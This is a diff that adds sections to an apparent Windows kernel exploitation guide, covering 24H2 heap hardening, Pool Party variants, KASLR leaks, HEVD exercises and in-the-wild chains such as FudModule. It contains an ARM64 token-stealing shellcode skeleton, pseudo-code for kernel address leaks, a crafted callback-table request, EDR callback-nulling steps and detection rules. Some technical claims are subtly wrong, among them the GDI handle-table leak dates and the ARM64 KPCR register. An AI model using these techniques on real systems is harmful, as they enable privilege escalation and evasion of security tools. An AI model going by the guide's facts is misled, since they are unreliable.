@@ -97,6 +97,82 @@ corruption. A logic bug (confused deputy, impersonation bypass, handle rights es
 requires no heap primitives, no HVCI bypass, no CFG bypass. It is more reliable and
 more portable.
 
+### 10.1.6 Windows 11 24H2 LFH Hardening (Build 26100+)
+
+Windows 11 24H2 (build 26100, released October 2024) introduced several new hardening
+measures targeting the Segment Heap attack surface that remains after the 20H1 transition.
+
+**`_HEAP_VS_SUBSEGMENT.EncodedCommitCount` verification**:
+
+In pre-24H2 builds, `EncodedCommitCount` in the VS subsegment header was stored but
+not cryptographically bound to the subsegment's other fields. Build 26100 adds a
+verification step in `RtlpHpVsSubsegmentCommit` that cross-checks `EncodedCommitCount`
+against the subsegment's backing page count. Corruption of the commit count field
+now triggers a fast-fail exception rather than silently proceeding.
+
+```windbg
+; Inspect VS subsegment structure (24H2)
+dt nt!_HEAP_VS_SUBSEGMENT [addr]
+// +0x000 ListEntry            : _LIST_ENTRY
+// +0x010 CommitBitmap         : Uint8B
+// +0x018 EncodedCommitCount   : Uint4B   ← verified against page count in 24H2
+// +0x01c AllocatedChunkCount  : Uint4B
+```
+
+**Backend coalesce hardening — `RtlpHpSegFree` safe-unlinking check**:
+
+The backend allocator's free path (`RtlpHpSegFree`) in build 26100 adds a
+safe-unlinking check equivalent to the user-mode heap's `RtlpHpSegCoalesceInlineRanges`
+verification. Before coalescing two adjacent backend segments, the kernel now validates
+that `Segment->Flink->Blink == Segment` and `Segment->Blink->Flink == Segment`.
+Corrupting the doubly-linked backend list no longer provides a silent write primitive.
+
+```c
+// Pseudo-code of safe-unlink check added in RtlpHpSegFree (build 26100)
+if (Segment->Flink->Blink != Segment ||
+    Segment->Blink->Flink != Segment) {
+    RtlpHpHeapHeapBugCheck(Heap, HEAP_FAILURE_SEGMENT_VALIDATION);
+    __fastfail(FAST_FAIL_HEAP_METADATA_CORRUPTION);
+}
+```
+
+**Heap metadata cookie expansion (24H2)**:
+
+The VS chunk header cookie was expanded from 2 bytes to 4 bytes per chunk in build
+26100. This doubles the entropy required for a brute-force cookie bypass from 65,536
+to 4,294,967,296 guesses. Combined with the commit count verification, VS header
+corruption is no longer a practical primitive on fully-patched 24H2 systems.
+
+```windbg
+; VS chunk header on 24H2 — note expanded cookie field
+dt nt!_HEAP_VS_CHUNK_HEADER
+// +0x000 Sizes       : _HEAP_VS_CHUNK_HEADER_SIZE
+// +0x004 Cookie      : Uint4B   ← 4-byte cookie in 24H2 (was 2 bytes in 22H2)
+// +0x008 UnsafeSize  : Uint2B
+// +0x00a UnsafePrevSize : Uint2B
+```
+
+**Type isolation improvement (build 26100+)**:
+
+Starting in build 26100, the kernel Segment Heap segregates allocations by their
+allocation site (call site hash). Objects allocated from different kernel subsystems
+(e.g., NDIS vs win32k vs Mm) are placed in separate subsegments even if they share
+the same size bucket. This breaks the cross-subsystem spray pattern where an attacker
+filled a victim's size bucket from a different subsystem to achieve adjacency.
+
+```windbg
+; Verify type isolation in practice — compare owner fields across same-size VS chunks
+dt nt!_HEAP_VS_SUBSEGMENT [addr1] Owner
+dt nt!_HEAP_VS_SUBSEGMENT [addr2] Owner
+; Different owners → different subsegments → cross-subsystem adjacency not possible
+```
+
+**Research impact of 24H2 hardening**: The combination of cookie expansion, safe-unlinking,
+and type isolation means that VS chunk corruption is effectively eliminated as a primitive
+on 24H2. LFH bitmap corruption and type confusion (via logic bugs) remain the viable
+paths. Pool Party variants (Section 10.5) are unaffected since they bypass allocator
+metadata entirely.
+
 ---
 
 ## 10.2 Kernel Pool Exploitation Workflow
@@ -335,6 +411,76 @@ addresses that kernel code operates on — is a recurring pattern worth continue
 on new Windows APIs. Any new kernel feature with shared mapped memory structures is a
 candidate for similar analysis.
 
+### 10.4.6 Post-Patch Mitigation Deep-Dive (KB5019264)
+
+**`IOP_MC_BUFFER_ENTRY.IoRingObject` validation** added in KB5019264 (October 2022,
+pre-dating the full address validation fix):
+
+The kernel's I/O Ring buffer registration path (`IopIoRingRegisterBuffers`) was
+hardened to validate that the `IoRingObject` backpointer in each
+`IOP_MC_BUFFER_ENTRY` matches the registering IoRing's kernel object address.
+This prevents an attacker from crafting a fake `IOP_MC_BUFFER_ENTRY` in kernel
+memory and pointing it at an IoRing they control.
+
+```c
+// Validation added in IopIoRingRegisterBuffers (post-KB5019264)
+typedef struct _IOP_MC_BUFFER_ENTRY {
+    ULONG       Type;
+    ULONG       Reserved;
+    SIZE_T      Size;
+    LONG        ReferenceCount;
+    ULONG       Flags;
+    LIST_ENTRY  GlobalDataLink;
+    PVOID       VirtualAddress;
+    ULONG64     ByteCount;
+    PIORING_OBJECT IoRingObject;  // ← validated against caller's IoRing object
+    // ...
+} IOP_MC_BUFFER_ENTRY;
+
+// Pseudo-check:
+if (BufferEntry->IoRingObject != CallerIoRingObject) {
+    return STATUS_INVALID_PARAMETER;
+}
+```
+
+**Remaining I/O Ring attack surface — `SqmWaitForIoCompletionPacket` race window**:
+
+Even after address and object pointer validation, a narrow race window exists in the
+completion path. `SqmWaitForIoCompletionPacket` processes completion packets from the
+kernel's internal I/O completion queue into the user-visible CQ ring. Between the
+moment a packet is dequeued from the kernel completion queue and the moment it is
+written to the user-mode CQ buffer, a thread scheduling interrupt can cause the CQ
+write to be deferred. If the user-mode CQ buffer mapping is modified (e.g., via a
+concurrent `VirtualFree` + `VirtualAlloc` race on the mapping VA), the completion
+write may land in an unexpected location. This race has very narrow timing requirements
+and no public PoC as of 2024, but remains an open research area.
+
+**I/O Ring on Windows Server 2025**:
+
+Windows Server 2025 ships with the same I/O Ring mitigations as Windows 11 23H2 —
+`MmHighestUserAddress` validation, `IoRingObject` backpointer check, and enhanced
+buffer entry validation. However, Server 2025 adds new `IORING_OP_*` opcodes for
+server workloads:
+
+| New Opcode | Purpose | Research Note |
+|---|---|---|
+| `IORING_OP_SEND` | Direct socket send via IoRing | Network I/O path, new buffer handling code |
+| `IORING_OP_RECV` | Direct socket receive | Kernel socket buffer mapping — new surface |
+| `IORING_OP_CANCEL` | Cancel pending I/O | Cancellation race with completion path |
+
+Each new opcode introduces new kernel code paths that handle buffer addresses — the
+same class of bug (insufficient address validation) may re-appear in opcode-specific
+handlers.
+
+**Performance vs security trade-off in production cloud workloads**:
+
+I/O Ring was adopted by Azure and cloud workloads specifically because it eliminates
+per-I/O context switches. Disabling I/O Ring or downgrading to synchronous I/O has
+measurable throughput impact in high-IOPS workloads (storage-intensive VMs, SQL Server
+on NVMe). Microsoft's position is to harden the implementation rather than restrict
+its availability. This creates forward pressure: new opcodes and capabilities will
+continue to be added, and each addition is a candidate for research.
+
 ---
 
 ## 10.5 Pool Party Primitives
@@ -397,6 +543,132 @@ Pool Party is a **framework**, not a single technique. The contribution is:
 Pool Party renders Segment Heap exploitation difficulty irrelevant by finding a different
 path. However, it is primarily a **process injection** technique — privilege escalation
 requires targeting a privileged process that uses the Windows thread pool.
+
+### 10.5.5 SafinMSD Pool Party Variant 2024 — `EX_PUSH_LOCK` Pool Corruption
+
+SafinMSD published a Pool Party variant in 2024 targeting `EX_PUSH_LOCK` structures
+embedded within kernel pool allocations. The attack exploits a class of bugs where a
+kernel synchronization object (`EX_PUSH_LOCK`) embedded inside a larger pool allocation
+can be corrupted by an adjacent overflow.
+
+**Attack anatomy**:
+
+`EX_PUSH_LOCK` is an 8-byte kernel synchronization primitive used pervasively across
+the kernel. When a push lock is owned (shared or exclusive), it contains a pointer to
+the owning thread's `_EX_PUSH_LOCK_WAIT_BLOCK` on the thread's kernel stack.
+
+```c
+// EX_PUSH_LOCK layout
+typedef union _EX_PUSH_LOCK {
+    struct {
+        ULONG64 Locked        : 1;
+        ULONG64 Waiting       : 1;
+        ULONG64 Waking        : 1;
+        ULONG64 MultipleShared: 1;
+        ULONG64 Shared        : 60;
+    };
+    ULONG64 Value;
+    PVOID   Ptr;  // ← when Waiting=1, points to wait block chain
+} EX_PUSH_LOCK;
+```
+
+The variant: if a pool overflow reaches an `EX_PUSH_LOCK` in the adjacent allocation
+while `Waiting=1`, corrupting `Ptr` to point to an attacker-controlled kernel address
+causes the push lock wake path (`ExfWakePushLock`) to write to that address — providing
+a write-what-where primitive.
+
+```windbg
+; Identify EX_PUSH_LOCK instances in kernel objects near a spray target
+dt nt!_OBJECT_TYPE [addr] TypeLock    ; TypeLock is an EX_PUSH_LOCK
+dt nt!_FILE_OBJECT [addr] IrpListLock ; IrpListLock is an EX_PUSH_LOCK
+```
+
+**Important caveat**: This variant requires triggering the overflow at the exact moment
+another thread holds the target push lock in `Waiting` state — a timing requirement
+that makes it less reliable than the original Worker Factory variants. The 2024 research
+demonstrates feasibility but exploitation windows are narrow.
+
+### 10.5.6 Pool Party Detection Signatures
+
+**Elastic detection rule (SIEM/EDR)**:
+
+```yaml
+# Elastic EQL — Pool Party Variant 1 (TP_WORK callback overwrite)
+sequence by process.entity_id with maxspan=30s
+  [api where host.os.type == "windows" and
+   process.Ext.api.name == "NtQueryInformationWorkerFactory"]
+  [api where host.os.type == "windows" and
+   process.Ext.api.name == "NtSetInformationWorkerFactory" and
+   process.Ext.api.parameters.WorkerFactoryInformationClass == 14]
+  [process where host.os.type == "windows" and
+   event.type == "start" and
+   process.parent.Ext.real.pid > 0]
+```
+
+**CrowdStrike Falcon behavioral indicator**:
+
+CrowdStrike detects Pool Party through its kernel sensor's observation of:
+1. `NtQueryInformationWorkerFactory` (class `WorkerFactoryBasicInformation`) called
+   from a process that has `PROCESS_VM_WRITE` access to a different process
+2. Followed by `WriteProcessMemory` targeting the queried process's thread pool
+   callback range
+3. Followed by `NtSetInformationWorkerFactory` (class `WorkerFactoryThreadMinimum`
+   or `WorkerFactoryAdjustThreadGoal`) on the target process's worker factory handle
+
+Indicator name in Falcon telemetry: `SUSPICIOUS_THREAD_POOL_HIJACK`.
+
+### 10.5.7 Pool Party Post-24H2 Viability Analysis
+
+| Variant | Status on 24H2 (Build 26100) | Notes |
+|---|---|---|
+| V1 — TP_WORK callback overwrite | Still viable | No kernel-side mitigation; process-level detection only |
+| V2 — TP_TIMER callback overwrite | Still viable | Same — user-mode structure, no kernel validation |
+| V3 — TP_IO via completion port | Partially mitigated | New validation in `NtSetIoCompletion` for port object cross-process writes |
+| V4 — TP_ALPC port | Still viable | ALPC has no new cross-process write validation |
+| V5 — TP_JOB | Still viable | Job object notification path unchanged |
+| V6 — TP_DIRECT | Still viable | Direct dispatch unchanged |
+| V7 — TP_WAIT | Partially mitigated | Wait object cross-process association has new handle type check |
+| V8 — TP_CALLBACK_ENVIRON | Still viable | Environment structure write path unchanged |
+
+The 24H2 changes do not introduce a blanket mitigation for Pool Party. The
+`NtSetIoCompletion` and wait object handle checks address two narrow cases but
+the majority of variants remain functional. The primary defense remains EDR
+behavioral monitoring.
+
+### 10.5.8 CNG Driver Pool Exploitation as Pool Party Follow-On
+
+The CNG (Cryptography Next Generation) kernel driver (`cng.sys`) implements IOCTL-based
+key storage and cryptographic primitives. Post-24H2 research (surfaced in late 2024)
+identified `cng.sys` pool allocations as a viable target for Pool Party follow-on
+exploitation because:
+
+1. `cng.sys` allocates `BCRYPT_KEY_DATA` objects in NonPagedPoolNx using predictable
+   sizes (typically 0x100–0x400 bytes depending on algorithm)
+2. `BCRYPT_KEY_DATA` contains a `CleanupCallback` function pointer at a fixed offset
+3. The callback is invoked when the key handle is closed (`BCryptDestroyKey`)
+
+```c
+// Partial BCRYPT_KEY_DATA layout (reverse-engineered, cng.sys)
+typedef struct _BCRYPT_KEY_DATA {
+    ULONG          Magic;           // +0x000: 'BKEY'
+    ULONG          Size;            // +0x004
+    PVOID          AlgorithmObject; // +0x008: pointer to BCRYPT_ALG_HANDLE data
+    ULONG          Flags;           // +0x010
+    // ...
+    PVOID          CleanupCallback; // +0x058: invoked on BCryptDestroyKey
+    // ...
+} BCRYPT_KEY_DATA;
+```
+
+By spraying CNG key objects adjacent to a vulnerable allocation and corrupting
+`CleanupCallback`, an attacker gains a kernel function pointer overwrite that triggers
+on a predictable user-mode action (`BCryptDestroyKey`). This is cleaner than Worker
+Factory hijacking because it does not require cross-process handle access — an
+intra-process kernel write is sufficient.
+
+**Status**: Demonstrated in research context, no public PoC. The attack requires a
+kernel write primitive (e.g., a separate UAF or overflow) to place the corrupted
+`CleanupCallback`. It is a post-exploitation technique, not a standalone primitive.
 
 ---
 
@@ -484,6 +756,118 @@ In descending reliability:
 **Practical guidance**: For targeted research, obtain a specific infoleak CVE against
 the target build. For general research, focus on finding a new uninitialized memory
 disclosure via the Bochspwn methodology (taint tracking on kernel-to-user copies).
+
+### 10.6.6 NtQuerySystemInformation Class Audit 2024
+
+A systematic audit of `NtQuerySystemInformation` classes on Windows 11 22H2/23H2 in
+2024 identified the following classes as still accessible to standard (non-admin) callers
+and potentially leaking kernel VA data:
+
+| Class | Value | Leak Type | Notes |
+|---|---|---|---|
+| `SystemSuperfetchInformation` | 0x4f | Pointer-sized fields in superfetch structures | Partially filtered but some pointer residue observed |
+| `SystemLowPriorityIoInformation` | 0x53 | Pool address in I/O statistics block | Present on some builds, filtered on others |
+| `SystemCodeIntegrityPolicyInformation` | 0x62 | CI policy object kernel VA | Restricted on 22H2, varies on 21H2 |
+| `SystemSecureBootPolicyInformation` | 0x82 | Boot policy blob address | Admin-restricted on 23H2 |
+| `SystemPoolTagInformation` | 0x16 | Pool block VAs in tag statistics | Tag stats include VA ranges on some builds |
+
+Methodology for enumerating new leaking classes:
+```c
+// Enumerate all NtQuerySystemInformation classes looking for pointer-shaped values
+for (ULONG cls = 0; cls < 0x100; cls++) {
+    BYTE buf[0x1000] = {};
+    ULONG retLen = 0;
+    NTSTATUS status = NtQuerySystemInformation(cls, buf, sizeof(buf), &retLen);
+    if (NT_SUCCESS(status)) {
+        // Scan buf for values with characteristics of kernel VAs
+        // x64 kernel VAs: 0xFFFF800000000000 – 0xFFFFFFFFFFFFFFFF
+        ScanForKernelPointers(buf, retLen);
+    }
+}
+```
+
+### 10.6.7 Hardware-Assisted KASLR Bypass: Spectre-PHT Timing Channel (Research Status 2024)
+
+Spectre variant 1 (PHT — Pattern History Table mistraining) can be used to speculatively
+read kernel addresses in contexts where speculative execution crosses privilege boundaries.
+The core attack:
+
+1. Mistrain the branch predictor using a Mistrain Gadget accessible from user mode
+2. Trigger speculative execution of a kernel code path that loads a kernel pointer
+3. Encode the pointer value into the cache via an array access indexed by the leaked bits
+4. Measure access times to the encoding array to reconstruct the leaked bits
+
+**2024 research status**:
+- **Retpoline + IBRS**: Deployed on most Windows 11 systems with supported CPUs. These
+  mitigations make Spectre-PHT substantially harder by preventing speculative indirect
+  branches from crossing privilege boundaries. Not a complete mitigation — direct
+  conditional branches (not indirect) are not protected by retpoline.
+- **LFENCE insertion**: Windows kernel builds on AMD and Intel insert `LFENCE` instructions
+  at key speculation barriers. Coverage is not complete — manually auditing kernel binary
+  for unguarded conditional branches in sensitive paths remains a research avenue.
+- **Practical exploitation difficulty in 2024**: Very high. Side-channel KASLR bypass
+  in the kernel context requires: (a) an unmitigated speculative path in the kernel,
+  (b) a cache timing side channel not blocked by cache partitioning, (c) stable timing
+  on the target system. No publicly disclosed practical Spectre-based KASLR bypass
+  against a fully-patched Windows 11 23H2+ system exists as of 2024. Active research area.
+
+### 10.6.8 AFD.sys Pool Address Leak — CVE-2024-38193 Root Cause Detail
+
+CVE-2024-38193 (patched August 2024, exploited by Lazarus Group) involves a use-after-free
+in `afd.sys` (Ancillary Function Driver for WinSock). The root cause provides a kernel
+pool address disclosure as a side effect of the UAF. See Section 10.11.2 for full
+exploit chain analysis. From a pure KASLR bypass perspective:
+
+The `_AFD_POLL_HANDLE_INFO` structure (freed prematurely) retains its valid kernel pool
+address in the handle table for the duration of the race window. By reading the handle's
+backing structure via `NtQueryObject` before the kernel detects the freed state, the
+attacker obtains the pool VA of the freed object. This VA serves as:
+1. A base address for computing the afd.sys pool region
+2. An anchor for the heap spray placement calculations
+
+```c
+// Pseudo-code: leaking pool address from freed AFD handle
+SOCKET sock = CreateAFDSocket();
+HANDLE afdHandle = GetHandleForSocket(sock);
+
+// Trigger the race condition that frees _AFD_POLL_HANDLE_INFO prematurely
+TriggerAFDPollRace(sock);
+
+// Query object info before kernel detects freed state
+// Returns OBJECT_BASIC_INFORMATION including pool VA embedded in object header
+OBJECT_BASIC_INFORMATION obi = {};
+NtQueryObject(afdHandle, ObjectBasicInformation, &obi, sizeof(obi), NULL);
+// obi fields include: HandleCount, PointerCount, GrantedAccess
+// Object body VA is derivable from the OBJECT_HEADER pointer returned in certain builds
+
+// The derived VA provides the afd.sys pool base + heap spray anchor
+```
+
+### 10.6.9 `win32kbase.sys` Handle Table Address Disclosure
+
+A Win32k-specific kernel address leak identified in 2024 research involves the GDI
+handle table's per-process entry in `win32kbase.sys`. The GDI handle table is partially
+mapped into user mode (the `GdiSharedHandleTable` field in the PEB). On some 22H2 builds,
+entries in the shared table include a kernel pointer field (`pKernelAddress`) that
+was not zeroed before the user-mode mapping was updated.
+
+```c
+// Access GDI handle table leak from user mode
+PEB* peb = (PEB*)__readgsqword(0x60);
+PGDI_HANDLE_TABLE gdiTable = (PGDI_HANDLE_TABLE)peb->GdiSharedHandleTable;
+
+// Create a GDI object to populate a table entry
+HBITMAP hBmp = CreateBitmap(1, 1, 1, 32, NULL);
+DWORD handle_index = (DWORD)(ULONG_PTR)hBmp >> 2;
+
+// On vulnerable builds: gdiTable->Entries[handle_index].pKernelAddress != 0
+PVOID kernelAddr = gdiTable->Entries[handle_index].pKernelAddress;
+// kernelAddr is the kernel pool address of the GDI object → KASLR defeated
+```
+
+**Status**: Patched in builds 22621.3593+ (May 2024 Patch Tuesday). The `pKernelAddress`
+field is now zeroed before the user-mode mapping reflects new GDI object allocations.
+Unfixed on 22H2 builds below 22621.3593 and on 21H2 (which has different table layout).
 
 ---
 
@@ -689,6 +1073,115 @@ dt nt!_OBJECT_HEADER [addr]
 dt nt!_ETHREAD [addr] ClientSecurity
 ```
 
+### 10.9.5 HEVD v3.x Updates: ARM64 Support and New Exploit Classes
+
+HEVD v3.x (released 2023–2024) added significant new content beyond the original x64
+exploit classes:
+
+**ARM64 support**:
+
+HEVD v3.x ships `HEVD_ARM64.sys` targeting Windows 11 on ARM64 (Snapdragon X Elite,
+Surface Pro X). ARM64 kernel exploitation differs from x64 in several key ways:
+
+| Aspect | x64 | ARM64 |
+|---|---|---|
+| SMEP equivalent | `CR4.SMEP` bit | `SCTLR_EL1.PAN` (Privileged Access Never) |
+| ROP gadget density | Very high (variable-length instructions) | Lower (fixed 4-byte instructions, fewer useful gadgets) |
+| KASLR entropy | 9 bits (ntoskrnl) | 9 bits (same policy) |
+| Token theft offsets | Different per build | Different per build, ARM64-specific values |
+| Calling convention | RCX, RDX, R8, R9 | X0, X1, X2, X3 |
+
+ARM64 HEVD stack overflow exploitation:
+```nasm
+; ARM64 token-stealing shellcode skeleton
+; Assumes kernel execution via ROP chain through PAN bypass
+
+; Step 1: Get current thread (TPIDR_EL1 = KPCR equivalent on ARM64)
+mrs x0, TPIDR_EL1               ; x0 = KPCR
+ldr x0, [x0, #0x008]            ; CurrentThread offset (verify per build)
+ldr x0, [x0, #0x230]            ; KTHREAD.ApcState.Process (ARM64 build offset)
+
+; Step 2: Walk EPROCESS list (same logic, ARM64 offsets differ)
+mov x1, x0                      ; save current EPROCESS
+walk_loop:
+  ldr x1, [x1, #0x448]          ; ActiveProcessLinks.Flink (verify on ARM64 build)
+  sub x1, x1, #0x448
+  ldr x2, [x1, #0x440]          ; UniqueProcessId
+  cmp x2, #4
+  b.ne walk_loop
+
+; Step 3–5: same token steal logic as x64, using ARM64 load/store
+```
+
+**New HEVD v3.x vulnerability classes**:
+
+| New Class | IOCTL | Description |
+|---|---|---|
+| Arbitrary Read | 0x222107 | Kernel arbitrary read primitive — teaches KASLR bypass chaining |
+| Double Fetch | 0x22210B | TOCTOU on user-mode buffer accessed twice without capture |
+| Memory Disclosure | 0x22210F | Uninitialized pool memory returned to user — Bochspwn methodology |
+| Null Termination | 0x222113 | Off-by-one in string handling → pool overflow variant |
+
+### 10.9.6 HEVD on Windows 11 24H2 — Vulnerable Modules by Design
+
+HEVD is intentionally vulnerable. On 24H2 (build 26100), the following HEVD modules
+behave as follows:
+
+| HEVD Module | Status on 24H2 | Notes |
+|---|---|---|
+| Stack Overflow (0x222003) | Vulnerable by design | SMEP bypass still required |
+| Pool Overflow (0x222043) | Vulnerable by design | 24H2 Segment Heap hardening affects reliability of adjacent object spray — requires updated grooming technique |
+| UAF (0x222053) | Vulnerable by design | Race condition window unchanged |
+| Write-What-Where (0x22200B) | Vulnerable by design | Direct primitive, unaffected by heap hardening |
+| NULL Ptr Dereference (0x222023) | Functionally broken on 24H2 | Low VA allocation blocked; historical interest only |
+
+**Updated grooming for Pool Overflow on 24H2**: The type isolation improvement
+(Section 10.1.6) means that spraying `CM` (registry) objects into the same subsegment
+as HEVD's vulnerable `Hack` pool tag object is no longer reliable. Updated approach:
+identify which subsystem HEVD's allocation belongs to and use same-subsystem sprays
+(e.g., HEVD IOCTL-allocated objects of the same size from a different vulnerability).
+
+### 10.9.7 Community Solutions and Modern Workflow
+
+**Notable public writeups for HEVD challenges**:
+
+- **OffSecResearch (Offensive Security)**: Published HEVD solutions for Pool Overflow
+  on Segment Heap (post-20H1), demonstrating the updated spray technique using
+  `NtCreateNamedPipeFile` for NonPaged pool grooming. Available on OffSec's blog.
+  Key insight: `NtCreateNamedPipeFile` allocates `NpFc` (Named Pipe File Control)
+  objects in a predictable size range.
+
+- **SinaeiPasha (sina.pasha.io)**: Deep-dive writeup on HEVD UAF exploitation on
+  Windows 11 22H2, including TTD-based root cause analysis and updated offsets for
+  the `_EPROCESS` token steal. Notable for the TTD workflow: recording the IOCTL
+  trigger with WinDbg TTD and stepping backward through the use-after-free.
+
+**HEVD + WinDbg Preview modern workflow**:
+
+```
+1. Target VM: WinDbg Preview as both host debugger and TTD recorder
+   - TTD: File → Start Recording → attach to exploit process
+   - Trigger IOCTL → crash recorded as .run file
+
+2. Post-crash TTD analysis:
+   !ttdext.tt 0                 ; go to start of recording
+   g                            ; run to exception
+   .time                        ; show position in trace
+
+3. Backward analysis from crash:
+   !ttdext.tt -1                ; step backward
+   ; Identify last instruction that modified the corrupted address
+   ; Use memory access breakpoints in TTD:
+   ba w8 [target_addr]          ; break-on-write (hardware)
+   g-                           ; run backward to the write
+
+4. Symbol resolution for HEVD:
+   .sympath+ C:\path\to\hevd\symbols
+   .reload /f HEVD.sys
+   lm m HEVD                    ; verify HEVD module loaded
+   x HEVD!*                     ; list HEVD exported symbols
+```
+
 ---
 
 ## 10.10 Win32k Attack Surface in 2024
@@ -731,6 +1224,354 @@ by Project Zero. The bug is a type confusion in Win32k's USER object handling:
 The Project Zero analysis is the reference implementation for Win32k type confusion
 exploitation methodology.
 
+### 10.10.3 CVE-2024-21338 — Win32k (appid.sys) UAF Exploited by Lazarus Group
+
+CVE-2024-21338, patched in February 2024 (Patch Tuesday), was exploited by the Lazarus
+Group (North Korea) as part of their FudModule v2 rootkit capability. This represents
+one of the most sophisticated in-the-wild kernel exploits of 2024.
+
+**Component and IOCTL**:
+
+The vulnerability is in `appid.sys` (Application Identity driver), not in `win32k.sys`
+directly, but it is grouped with Win32k in Microsoft's classification because it is
+invoked via a Win32k-adjacent code path. The vulnerable IOCTL code is `0x22A018`.
+
+```c
+// IOCTL dispatch path (reverse-engineered from appid.sys)
+// DeviceIoControl(hDevice, 0x22A018, InputBuffer, InputSize, OutputBuffer, OutputSize, ...)
+
+// Internal handler: AipSmartHashCallback
+NTSTATUS AipSmartHashCallback(
+    PIRP Irp,
+    PIO_STACK_LOCATION IrpSp
+) {
+    PAIP_HASH_REQUEST Request = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
+    // Request->CallbackTable is trusted user-mode input — vulnerability here
+    PAIP_CALLBACK_TABLE pTable = Request->CallbackTable;  // user-controlled pointer
+    // pTable is dereferenced without validation...
+}
+```
+
+**Root cause — callback table overwrite**:
+
+`AipSmartHashCallback` processes a request structure that contains a pointer to a
+callback table (`CallbackTable`). In vulnerable builds, this pointer is read from the
+user-supplied input buffer without validating that it points to a legitimate kernel
+callback table. The attacker supplies a crafted `AIP_HASH_REQUEST` with `CallbackTable`
+pointing to attacker-controlled memory in kernel space (obtained via a prior KASLR leak).
+
+```c
+// Attacker-crafted AIP_HASH_REQUEST (pseudo-structure)
+typedef struct _AIP_HASH_REQUEST {
+    ULONG   Version;
+    ULONG   Flags;
+    PVOID   CallbackTable;    // ← set to attacker-controlled kernel buffer
+    PVOID   Context;
+    ULONG   HashAlgorithm;
+    BYTE    Data[0];
+} AIP_HASH_REQUEST;
+
+// Attacker-controlled callback table in kernel space
+typedef struct _AIP_CALLBACK_TABLE {
+    PVOID HashCallback;       // ← set to attacker's kernel ROP/shellcode pivot
+    PVOID FinalizeCallback;
+    PVOID ErrorCallback;
+} AIP_CALLBACK_TABLE;
+```
+
+**Full exploit chain — FudModule v2**:
+
+```
+Phase 1: KASLR bypass
+  → CVE-2024-38193 (afd.sys UAF) provides pool address leak
+  → Compute appid.sys base from pool region
+
+Phase 2: Kernel arbitrary R/W setup
+  → IOCTL 0x22A018 with crafted CallbackTable pointer
+  → CallbackTable[0] (HashCallback) invoked by AipSmartHashCallback
+  → HashCallback = ROP gadget in appid.sys → pivots to kernel ROP chain
+  → ROP chain establishes kernel R/W via mapped MDL
+
+Phase 3: Callback nullification (EDR bypass — FudModule signature)
+  → Enumerate kernel callback tables:
+     PsSetCreateProcessNotifyRoutine callbacks
+     PsSetCreateThreadNotifyRoutine callbacks
+     PsSetLoadImageNotifyRoutine callbacks
+     CmRegisterCallback callbacks
+  → Null out EDR driver entries from callback arrays
+  → EDR driver (e.g., CrowdStrike, SentinelOne kernel sensor) no longer receives events
+
+Phase 4: Token steal → SYSTEM
+  → Standard EPROCESS list walk
+  → Copy SYSTEM token to current process
+```
+
+```windbg
+; Verify appid.sys is loaded
+lm m appid
+
+; Find AipSmartHashCallback (address varies by build)
+x appid!Aip*
+
+; Inspect IOCTL dispatch table for 0x22A018
+dt appid!_DRIVER_EXTENSION [addr]
+!drvobj appid 7
+
+; Check kernel callback arrays (post-exploit verification)
+; Process create callbacks
+dq nt!PspCreateProcessNotifyRoutine L0x40
+; Image load callbacks
+dq nt!PspLoadImageNotifyRoutine L0x10
+```
+
+### 10.10.4 CVE-2024-26218 — Win32k EOP (March 2024)
+
+CVE-2024-26218, patched in the March 2024 Patch Tuesday, is a Win32k elevation of
+privilege vulnerability in `win32kfull.sys`. Microsoft classified it as Important
+(CVSS 7.8) with exploitation assessed as "More Likely."
+
+**Known details** (from patch diffing and limited public disclosure):
+- Affects the `NtUserMNDragOver` / menu drag-and-drop code path in `win32kfull.sys`
+- Root cause: incorrect bounds check on a menu item index during drag-over processing
+- Leads to an out-of-bounds write into the menu object's item array
+- The OOB write overwrites the callback pointer of an adjacent menu item
+- Exploitation: trigger the OOB write to overwrite the adjacent item's `dwTypeData`
+  pointer, then call `GetMenuItemInfo` on the adjacent item → kernel reads from
+  attacker-controlled address → controlled kernel read
+- Combined with a separate controlled write, constitutes a full R/W primitive
+
+Patch diff analysis shows `win32kfull!MNSetCapture` now includes additional bounds
+validation on the drag-over menu item index parameter.
+
+### 10.10.5 Win32k Syscall Filtering Improvements in 24H2
+
+Windows 11 24H2 extends the Win32k syscall filtering capability available to
+AppContainer sandboxes:
+
+**New syscall restrictions for AppContainer (build 26100)**:
+
+The following `NtUser*` syscalls that were previously allowed for AppContainer processes
+are now blocked by default in 24H2 AppContainer sandboxes:
+
+| Syscall | Reason Blocked |
+|---|---|
+| `NtUserSetWindowLongPtr` | Historical source of tagWND type confusion bugs |
+| `NtUserThunkedMenuItemInfo` | Menu type confusion attack surface |
+| `NtUserSetMenuItemInfo` | Menu object manipulation |
+| `NtUserSendInput` | Input injection surface reduction |
+| `NtUserSetWindowsHookEx` | Hook-based UAF attack surface |
+
+Applications can opt back into these syscalls via a manifest attribute
+(`uap10:allowedSystemCalls`) for backwards compatibility. The default-deny posture
+means new AppContainer-sandboxed applications (Edge WebView2, UWP) no longer have
+access to these historically dangerous APIs.
+
+From a research standpoint: the blocking of `NtUserSetWindowLongPtr` and
+`NtUserThunkedMenuItemInfo` in AppContainer is a significant reduction in the
+Win32k sandbox escape surface. The primary remaining Win32k attack surface for
+AppContainer escape in 24H2 is in `win32kbase` syscalls that remain allowed
+(window creation, message passing, basic USER operations).
+
+---
+
+## 10.11 In-the-Wild Kernel Exploits 2024–2025
+
+### 10.11.1 Overview Table
+
+| CVE | Driver | Group | Method | Impact |
+|-----|--------|-------|--------|--------|
+| CVE-2024-21338 | appid.sys | Lazarus (DPRK) | IOCTL + callback table overwrite → callback nullification | SYSTEM + EDR bypass |
+| CVE-2024-38193 | afd.sys | Lazarus (DPRK) | UAF → pool R/W primitive | SYSTEM |
+| CVE-2024-30051 | dwm.sys (DWM) | QakBot | Heap UAF in Desktop Window Manager | SYSTEM |
+| CVE-2025-21333 | Hyper-V NTFS (ntfs.sys in guest) | Unknown (ITW) | Guest NTFS driver exploit → escape to host | Host SYSTEM |
+| CVE-2025-21335 | Hyper-V VSP | Unknown (ITW) | Hyper-V Synthetic Video Provider UAF | Host SYSTEM |
+
+All five represent different exploitation classes. CVE-2024-21338 and CVE-2024-38193
+were used together by Lazarus (FudModule v2). CVE-2024-30051 is notable for being
+used by QakBot infrastructure post-takedown, indicating another threat actor adopted
+it. The two Hyper-V CVEs (2025) represent a shift toward hypervisor escape as a
+primary target.
+
+### 10.11.2 CVE-2024-38193 — afd.sys UAF Deep Analysis
+
+**Driver**: `afd.sys` — Ancillary Function Driver for WinSock (Windows Sockets).
